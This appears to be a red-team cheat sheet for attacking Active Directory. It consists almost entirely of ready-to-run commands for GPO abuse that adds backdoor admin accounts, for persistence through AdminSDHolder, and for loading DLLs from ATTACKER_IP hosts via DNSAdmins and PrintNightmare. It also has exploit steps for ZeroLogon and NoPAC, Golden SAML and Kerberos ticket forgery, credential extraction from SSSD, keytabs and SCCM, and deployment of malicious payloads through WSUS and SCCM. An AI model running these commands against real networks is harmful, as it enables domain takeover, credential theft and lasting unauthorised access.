# AD Misc - GPO, Groups, Trusts, RODC, ADFS, Linux, DNS, CVEs, Deployments

## GPO Abuse

**Find vulnerable GPOs** (where you have Write rights):
```ps1
Get-DomainObjectAcl -Identity "VulnGPO" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|WriteProperty|GenericAll|WriteOwner"}
nxc ldap DC -u user -p pass -M gpo_list  # list GPOs

# Analyze with GPOHound
gpohound dump --json
gpohound analysis --enrich
gpohound analysis --computer 'SRV.DOMAIN.LOCAL' --order
```

**SharpGPOAbuse** (C#, Windows):
```ps1
# Add local admin
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "VulnGPO"

# Add user rights
SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "VulnGPO"

# Immediate computer task (runs on next GPO refresh ~90min, or gpupdate /force)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user hacker P@ss /add && net localgroup administrators hacker /add" --GPOName "VulnGPO"
```

**pyGPOAbuse** (Linux):
```ps1
python pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
python pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "..." -powershell -command "SHELL_CMD" -taskname "Legit Task" -user
```

**GroupPolicyBackdoor** (Python, Linux):
```ps1
python3 gpb.py gpo inject --domain corp.com --dc ad01-dc.corp.com -k --module modules_templates/ImmediateTask_create.ini --gpo-name TARGET_GPO
python3 gpb.py gpo clean --domain corp.com --dc ad01-dc.corp.com -k --state-folder state_folders/2025_07_15_075047
```

**PowerGPOAbuse** (PowerShell):
```ps1
Add-LocalAdmin -Identity 'attacker' -GPOIdentity 'VulnGPO'
Add-GPOImmediateTask -TaskName 'evil' -Command 'cmd.exe' -CommandArguments '/c net user attacker P@ss /add' -Scope Computer -GPOIdentity 'VulnGPO'
```

---

## Group Attacks

### AdminSDHolder

Modify AdminSDHolder ACL → SDProp propagates it to all protected groups (DA, EA, Schema Admins, etc.) every ~60 minutes = persistence.

```ps1
# Add GenericAll on AdminSDHolder (pushed to all protected accounts in ~1hr)
bloodyAD --host DC -d domain.lab -u attacker -p pass add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=lab' attacker
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity attacker -Rights All

# Find users with AdminCount=1 (protected accounts, may have stale protection)
netexec ldap DC -u user -p pass --admin-count
bloodyAD --host DC -d domain.lab -u user -p pass get search --filter '(admincount=1)' --attr sAMAccountName
([adsisearcher]"(AdminCount=1)").findall()
```

### DNSAdmins → SYSTEM (via DLL injection into dns.exe)

```ps1
# Enumerate members
bloodyAD --host DC -d domain.lab -u user -p pass get object DNSAdmins --attr msds-memberTransitive

# Set malicious DLL (requires DNS service restart)
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll
dnscmd DC01 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

# Verify
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

# Restart DNS
sc \\dc01 stop dns && sc \\dc01 start dns
```

### Backup Operators → NTDS Dump

```ps1
# Enumerate members
bloodyAD --host DC -d domain.lab -u user -p pass get object "Backup Operators" --attr msds-memberTransitive

# Enable SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll; Set-SeBackupPrivilege

# Copy sensitive files
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit -Overwrite

# Remote (NetExec)
nxc smb DC -u user -p pass -M backup_operator
.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\ATTACKER\share\
```

### Machine Account Quota (MAQ)

```ps1
# Check MAQ (default=10)
nxc ldap DC -u user -p pass -M maq
nxc ldap DC -u user -p pass --kdcHost DC -M MAQ

# Create computer account (requires MAQ>0)
addcomputer.py -computer-name 'ControlledPC$' -computer-pass 'P@ssw0rd' -dc-host DC -domain-netbios DOMAIN 'domain.local/user:pass'
New-MachineAccount -MachineAccount ControlledPC -Password $(ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)
```

---

## Domain Trust Attacks

### Trust Relationships

| Source | Target | Technique | Trust |
|--------|--------|-----------|-------|
| Root | Child | Golden Ticket + EA group /groups | Inter-Realm 2-way |
| Child | Root | SID History /sids (S-1-5-21-PARENT-519) | Tree-Root 2-way |
| Forest A | Forest B | PrinterBug + Unconstrained delegation | Forest/External 2-way |

```ps1
# Enumerate trusts
nltest /trusted_domains
Get-NetDomainTrust; Get-NetForestTrust
nxc ldap DC -u user -p pass -M enum_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

### SID History — Child → Parent

```ps1
# Get SID (change 502 to 519 for Enterprise Admins)
lookupsid.py domain/user:pass@DC_IP | grep krbtgt
# S-1-5-21-CHILD-502 → use S-1-5-21-PARENT-519 in /sids

# Forge Golden Ticket with parent's EA SID
kerberos::golden /user:Administrator /krbtgt:CHILD_KRBTGT_HASH /domain:child.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-CHILD -domain child.local -extra-sid S-1-5-21-PARENT-519 -user-id 500 Admin
export KRB5CCNAME=Admin.ccache
psexec.py -k -no-pass child.local/Admin@dc.parent.local
```

### Trust Ticket (Cross-Forest)

```ps1
# Dump trust key
lsadump::trust /patch
lsadump::dcsync /user:child\parentdomain$

# Forge inter-realm TGT (Mimikatz)
kerberos::golden /domain:child.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /rc4:TRUST_KEY /user:Admin /service:krbtgt /target:parent.local /ticket:trust.kirbi

# Get ST for parent resources
Rubeus.exe asktgs /ticket:trust.kirbi /service:LDAP/dc.parent.local /ptt
```

### PAM Trust (Bastion Forest)

```ps1
# Enumerate PAM trusts
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid

# Add to shadow group (persistence)
bloodyAD --host DC -u user -p pass -d domain add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,...' Administrator
```

---

## RODC Attacks

```ps1
# RODC Golden Ticket (only works for principals in msDS-RevealOnDemandGroup, not in msDS-NeverRevealGroup)
Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES_HASH /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-...
Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:TGT_B64

# RODC Key List Attack (dump cached creds from RODC)
keylistattack.py DOMAIN/user:pass@RODC_HOST -rodcNo RODCID -rodcKey RODC_KRBTGT_HASH -full
secretsdump.py DOMAIN/user:pass@RODC_HOST -rodcNo RODCID -rodcKey RODC_KRBTGT_HASH -use-keylist

# If you have GenericWrite/GenericAll on RODC computer object:
# Add admin to msDS-RevealOnDemandGroup
bloodyAD --host DC -d domain.local -u user -p pass set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC PRP Group,...' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
```

---

## ADFS / Golden SAML

```ps1
# Dump DKM key (thumbnailPhoto attribute)
ldapsearch -x -H ldap://DC -b "CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local" -D "adfs-svc@domain.local" -W -s sub "(&(objectClass=contact)(!(name=CryptoPolicy)))" thumbnailPhoto
echo "RETRIEVED_KEY" | base64 -d > adfs.key

# Dump ADFS signing cert via SQL (WID: \\.\pipe\MICROSOFT##WID\tsql\query)
# Run ADFSDump as ADFS service account
echo "BASE64_PFX" | base64 -d > EncryptedPfx.bin

# Forge Golden SAML (ADFSpoof)
python ADFSpoof.py -b EncryptedPfx.bin adfs.key -s adfs.domain.local saml2 \
  --endpoint https://app.domain.com/adfs/ls/SamlResponseServlet \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
  --nameid 'DOMAIN\administrator' --rpidentifier AppName \
  --assertions '<Attribute Name="windowsaccountname"><AttributeValue>DOMAIN\administrator</AttributeValue></Attribute>'

# For Office 365
python3 ADFSpoof.py -b adfs.bin adfs.key -s sts.domain.local o365 --upn user@domain.local --objectguid GUID

# shimit (CyberArk)
python ./shimit.py -idp http://adfs.domain.local/adfs/services/trust -pk key -c cert.pem -u domain\admin -n admin@domain.com -r ADFS-admin
```

---

## Linux AD Integration Attacks

```ps1
# CCACHE tickets from /tmp
ls /tmp/ | grep krb5cc
export KRB5CCNAME=/tmp/krb5cc_1569901115
netexec smb DC -k --shares  # use cached ticket

# CCACHE from keyring (requires root)
/tmp/tickey -i  # extracts and saves ccache files to /tmp/__krb_UID.ccache

# CCACHE from SSSD KCM (requires root)
python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey

# Extract NT hash from keytab (type 23 = RC4 = NTLM)
klist -t -K -e -k FILE:/etc/krb5.keytab
python3 keytabextract.py krb5.keytab  # sosdave/KeyTabExtract
python KeytabParser.py /etc/krb5.keytab  # its-a-feature/KeytabParser

# Use keytab with NetExec
netexec smb DC -u 'COMPUTER$' -H NTLM_FROM_KEYTAB -d DOMAIN

# SSSD obfuscated password
cat /etc/sssd/sssd.conf | grep ldap_default_authtok
./sss_deobfuscate BASE64_TOKEN  # mludvig/sss_deobfuscate

# SSSD keyring (if krb5_store_password_if_offline=True → plaintext password stored)
gdb -p PID_OF_SSSD
call system("keyctl show > /tmp/out")
# Find key_id, then:
call system("keyctl print KEY_ID > /tmp/out")

# SSH GSSAPI abuse (UPN hijack)
bloodyAD --host DC -d domain.local -u user -p pass set object username userPrincipalName -v 'administrator'
getTGT.py -dc-ip DC "domain.local/username:pass" -principalType NT_ENTERPRISE
export KRB5CCNAME=username.ccache
ssh -K username@domain.local@linux.domain.local
```

---

## AD Integrated DNS (ADIDNS)

```ps1
# Enumerate DNS records
adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp
bloodyAD --host DC -d domain.lab -u user -p pass get dnsDump
StandIn.exe --dns --limit 20 --filter SQL

# Add wildcard record (poisons name resolution, combine with Responder)
dnstool.py -u 'DOMAIN\user' -p 'pass' --record '*' --action add --data ATTACKER_IP DC
Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3

# Dynamic DNS update (if zone allows non-secure updates)
nsupdate dnsupdate.txt  # see SKILL.md for nsupdate syntax

# Cleanup
bloodyAD --host DC -d domain.lab -u user -p pass remove dnsRecord dc1.domain.lab ATTACKER_IP
```

---

## Critical CVEs

### MS14-068 (Kerberos Checksum)
Allows any domain user to forge a TGT with Domain Admin privileges.

```ps1
# Get user SID
rpcclient DC -c "lookupnames john.smith"
nxc ldap DC -u user -p pass -k --get-sid

# Exploit (pykek or Metasploit)
python ms14-068.py -u user@domain.local -s S-1-5-21-...-1107 -d DC_IP -p Password
# metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
```

### ZeroLogon (CVE-2020-1472)
Bypass Netlogon auth → reset DC machine account password to null → DCSync.

```ps1
# Check
python3 zerologon_tester.py DC01 DC_IP

# Exploit (sets machine account password to empty)
python3 cve-2020-1472-exploit.py DC01 DC_IP

# Find old NT hash (use empty hash for DC$)
secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC01$@DC01.DOMAIN.LOCAL'

# Restore (CRITICAL - must restore or DC breaks)
python restorepassword.py DOMAIN/DC01@DC01.DOMAIN.LOCAL -target-ip DC_IP -hexpass HEX_PLAIN_PASSWORD
```

### NoPAC (CVE-2021-42278/42287)
sAMAccountName spoofing → forge TGT as DC → S4U2self → impersonate DA.

```ps1
# Check
nxc smb DC -u '' -p '' -d domain -M nopac
nxc ldap DC -u user -p pass -M MAQ  # need MAQ > 0

# Automated (all-in-one)
python noPac.py 'domain.local/user' -hashes ':NTHASH' -dc-ip DC_IP -use-ldap -dump

# Manual
addcomputer.py -computer-name 'FakePC$' -computer-pass 'Pass' -dc-host DC01 domain.local/user:pass
addspn.py -u 'domain\user' -p pass -t 'FakePC$' -c DC01  # clear SPNs
renameMachine.py -current-name 'FakePC$' -new-name 'DC01' domain.local/user:pass
getTGT.py -dc-ip DC_IP domain.local/DC01:Pass
KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'DomAdmin' -spn 'cifs/DC01.domain.local' -k -no-pass domain.local/DC01
KRB5CCNAME='DomAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass domain.local@DC01.domain.local
```

### PrintNightmare (CVE-2021-1675/34527)
Remote code execution via Spooler service (load arbitrary DLL).

```ps1
# Check
rpcdump.py @DC | egrep 'MS-RPRN|MS-PAR'
nxc smb DC -u user -p pass -M spooler

# Host payload
python3 smbserver.py share /tmp/smb/
# or: SharpWebServer.exe port=8888 dir=c:\share verbose=true

# Windows exploit
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "attacker" -NewPassword "P@ssw0rd" -DriverName "Print"
# or remote DLL
Invoke-Nightmare -DLL "\\ATTACKER\share\evil.dll"
```

### PrivExchange
Exchange server coerced to authenticate → relay to LDAP → grant DCSync.

```ps1
# Relay to LDAP
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username

# Coerce Exchange to authenticate
python privexchange.py -ah ATTACKER_IP mail.domain.local -d domain.local -u user_exchange -p pass_exchange

# DCSync
secretsdump.py domain/username@DC_IP -just-dc
```

---

## Deployment Attacks

### SCCM

```ps1
# Enumerate
sccmhunter.py find -u user -p pass -dc-ip DC -d domain.lab
SharpSCCM.exe get devices
MalSCCM.exe locate

# Network Access Account credentials (CRED-2)
SharpSCCM.exe get naa
SharpSCCM.exe get secrets -u machine$ -p pass

# DPAPI blobs (CRED-3, local admin on SCCM client)
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
SharpSCCM.exe local secrets -m wmi

# Deploy malicious app via MalSCCM
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET
MalSCCM.exe app /create /name:evil /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"
MalSCCM.exe app /deploy /name:evil /groupname:TargetGroup /assignmentname:deploy
MalSCCM.exe checkin /groupname:TargetGroup
# Cleanup
MalSCCM.exe app /cleanup /name:evil && MalSCCM.exe group /delete /groupname:TargetGroup

# PXE credential theft (CRED-1)
python3 pxethiefy.py explore -i eth0
```

### MDT (Microsoft Deployment Toolkit)

```ps1
# Access deployment share (usually \\SERVER\DeploymentShare$)
# Files to find: Bootstrap.ini, CustomSettings.ini

# Credential fields to look for:
# DomainAdmin, DomainAdminPassword, UserID, UserPassword, AdminPassword
# ADDSUserName, ADDSPassword, SafeModeAdminPassword, DBID, DBPwd

# Also check: ts.xml files, Scripts/ folder, Applications/ folder
# Extract from ISO: LiteTouchPE_x86|x64.iso/sources/bootstrap.ini
```

### WSUS

```ps1
# Locate WSUS server
SharpWSUS.exe locate
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate

# Exploit (payload must be MS-signed binary)
SharpWSUS.exe inspect
SharpWSUS.exe create /payload:"C:\path\to\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user hacker P@ss /add && net localgroup administrators hacker /add\"" /title:"WSUSDemo"
SharpWSUS.exe approve /updateid:UPDATE_GUID /computername:TARGET.domain.local /groupname:"Demo Group"
SharpWSUS.exe check /updateid:UPDATE_GUID /computername:TARGET.domain.local
SharpWSUS.exe delete /updateid:UPDATE_GUID /computername:TARGET.domain.local /groupname:"Demo Group"
```

### DCOM (Lateral Movement)

```ps1
# Impacket
dcomexec.py -share C$ -object MMC20 'DOMAIN/user:pass@TARGET'
dcomexec.py -object MMC20 -silentcommand 'DOMAIN/user:pass@TARGET' 'calc.exe'

# PowerShell via MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")

# Invoke-DCOM
Invoke-DCOM -ComputerName 'TARGET_IP' -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName 'TARGET_IP' -Method ExcelDDE -Command "calc.exe"
Invoke-DCOM -ComputerName 'TARGET_IP' -Method ShellWindows -Command "calc.exe"
```

---

## AD Recycle Bin

```ps1
# List deleted objects (requires LIST_CHILD on Deleted Objects container)
bloodyAD -u user -d domain -p pass --host DC get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name
Get-ADObject -Filter 'Name -Like "*User*"' -IncludeDeletedObjects

# Check restore rights
bloodyAD --host DC -d domain -u user -p pass get writable --include-del

# Restore deleted object (retains all attributes including sensitive ones!)
bloodyAD -u user -d domain -p pass --host DC set restore 'S-1-5-21-...-1104'  # by SID
# Note: tombstoned objects retain most important attributes; deleted objects retain ALL attributes
```
